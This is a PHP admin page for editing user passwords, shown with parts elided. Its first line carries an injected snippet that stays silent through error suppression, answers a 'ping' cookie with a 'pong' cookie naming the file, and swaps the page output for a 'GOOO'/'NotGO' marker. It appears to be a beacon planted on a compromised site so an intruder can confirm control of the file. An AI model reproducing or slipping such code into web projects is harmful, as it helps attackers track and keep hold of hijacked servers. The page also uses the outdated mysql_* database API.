<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/pass_edit.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/pass_edit.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/pass_edit.php<-";}return "NotGO->./cynergi/admin/pass_edit.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
...
if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "form1")) {
  $updateSQL = sprintf("UPDATE tbl_users SET username=%s, `names`=%s, password=%s, id_admin=%s WHERE id_user=%s",
...
mysql_select_db($database_dplace, $dplace);
$query_usu = sprintf("SELECT * FROM tbl_users WHERE id_user = %s", GetSQLValueString($colname_usu, "int"));
    ...
    <td align="center" valign="top"><p>&nbsp;</p>
      ...
      <form id="form1" name="form1" method="POST" action="<?php echo $editFormAction; ?>">
        <table width="400" border="1">
          ...
          <tr>
            <td align="left" class="etiqueta"><input name="hidden_id" type="hidden" id="hidden_id" value="<?php echo $row_usu['id_user']; ?>" />
            <input name="hidden_admin" type="hidden" id="hidden_admin" value="<?php echo $row_usuario['id_user']; ?>" /></td>
            <td align="left"><label>
